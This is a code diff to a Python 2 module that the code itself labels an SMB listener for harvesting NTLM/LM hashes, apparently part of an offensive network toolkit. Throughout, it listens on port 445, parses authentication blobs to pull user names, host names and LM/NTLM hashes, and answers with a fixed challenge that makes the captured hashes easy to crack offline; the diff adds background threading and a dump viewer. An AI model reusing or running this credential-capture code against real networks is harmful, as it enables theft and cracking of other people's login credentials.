@@ -1,5 +1,6 @@
 import socket, struct, sys
 import util
+from threading import Thread
 
 #
 # SMB listener for harvesting NTLM/LM hashes.
@@ -9,47 +10,75 @@ import util
 class SMBService:
 	def __init__(self):
 		self.captured_hashes = {}	
+		self.running = False
+		self.dump = False
+		self.log_data = False
+		self.log_loc = None
 	
 	# parse NTLM/LM hashes
 	# scapy has very limited SMB packet support, so we have to do this manually
 	def parse_credentials(self, data):
 		# offsets based on security blob starting at data[59]
 		data = data[59:]
-
+		
 		lm_offset = struct.unpack('<I', data[16:20])[0]
 		ntlm_offset = struct.unpack('<I', data[24:28])[0]
-		name_offset = struct.unpack('<I', data[40:44])[0]
 		name_length = struct.unpack('<h', data[36:38])[0]
+		name_offset = struct.unpack('<I', data[40:44])[0]
+		host_length = struct.unpack('<h', data[46:48])[0]
+		host_offset = struct.unpack('<I', data[48:52])[0]
 
 		lm_hash = ntlm_hash = ''
+		# LM hash
 		for i in data[lm_offset:lm_offset+24]:
 			tmp = str(hex(ord(i))).replace('0x', '')
 			if len(tmp) is 1:
 				# hex() removes leading 0's in hex; we need them.
 				tmp = '0' + tmp
 			lm_hash += tmp
+		# NTLM hash
 		for i in data[ntlm_offset:ntlm_offset+24]:
 			tmp = str(hex(ord(i))).replace('0x', '')
 			if len(tmp) is 1:
 				tmp = '0' + tmp
 			ntlm_hash += tmp
 		
+		# host name
+		hname = ''
+		for i in range(host_offset, (host_offset+host_length)): 
+			tmp = struct.unpack('<c',data[i])[0]
+			if tmp is '\x00':
+				continue
+			hname += tmp
+		
 		if name_length > 100:
 			# sanity
 			return
 		
+		# user name
 		uname = ''
 		for i in range(name_offset, (name_offset+name_length)):
-			uname += struct.unpack('<c',data[i])[0]
-		
-		# add the username and lm/ntlm hashes
+			tmp = struct.unpack('<c',data[i])[0]
+			if tmp is '\x00':
+				# null bytes
+				continue
+			uname += tmp 
+
+		# add the username and build the list
+		# list consists of
+			# HOST NAME
+			# LM HASH
+			# NTLM HASH
 		if not uname in self.captured_hashes:
-			tmp = [lm_hash, ntlm_hash]
+			tmp = [hname, lm_hash.upper(), ntlm_hash.upper()]
 			self.captured_hashes[uname] = tmp
 
-		util.Msg('\tUser name: %s'%(uname))
-		util.Msg('\tLM:   %s'%(lm_hash.upper()))
-		util.Msg('\tNTLM: %s'%ntlm_hash.upper())
+		if self.dump:
+			util.Msg('\tUser name: \033[32m%s\033[0m'%(uname))
+			util.Msg('\tHost: \033[32m%s\033[0m'%(hname))
+			util.Msg('\tLM:   \033[32m%s\033[0m'%(lm_hash.upper()))
+			util.Msg('\tNTLM: \033[32m%s\033[0m'%ntlm_hash.upper())
+			util.Msg('\tChallenge: \033[32m%s\033[0m'%('1122334455667788'))
 
 	# get packet payload 
 	def get_payload(self, data):
@@ -144,9 +173,16 @@ class SMBService:
 				else:
 					return False
 		except Exception, j:
-			print 'Error: ', j
+		   	util.Error('SMB error: %s'%j)
 			return False	
 		return True
+
+	# threaded init
+	def initialize_bg(self):
+		util.Msg('Starting SMB listener...')
+		thread = Thread(target=self.initialize)
+		thread.start()
+		return
 
 	# initialize SMB listener
 	def initialize(self):
@@ -155,22 +191,40 @@ class SMBService:
 		socker.settimeout(3)
 		socker.bind(('', 445))
 		socker.listen(5)
-		while True:
+		self.running = True
+		while self.running:
 			try:
 				con, addr = socker.accept()
-				util.Msg('Connection from %s'%addr[0])	
-				while True:
+				if self.dump: util.Msg('Connection from %s'%addr[0])	
+				while self.running:
 					data = con.recv(256)
 					if not self.handler(con, data):
 						break
 				con.shutdown(socket.SHUT_RDWR)
 				con.close()
-				util.Msg('Closed connection with %s.\n'%addr[0])
+				if self.dump: util.Msg('Closed connection with %s.\n'%addr[0])
 			except KeyboardInterrupt:
+				self.running = False
 				break
 			except socket.error:
 			 	continue
 			except Exception, j:
 			 	util.Error('Error with SMB listener: %s'%j)
+			 	self.running = False
 			 	break
 		socker.close()
+		util.debug('SMB listener shutdown.')
+	
+	# shutdown		  
+	def shutdown(self):
+		util.Msg('Shutting SMB listener down')
+		self.running = False
+
+	# view dumps
+	def view(self):
+		try:
+			while True:
+				self.dump = True
+		except KeyboardInterrupt:
+			self.dump = False
+			return
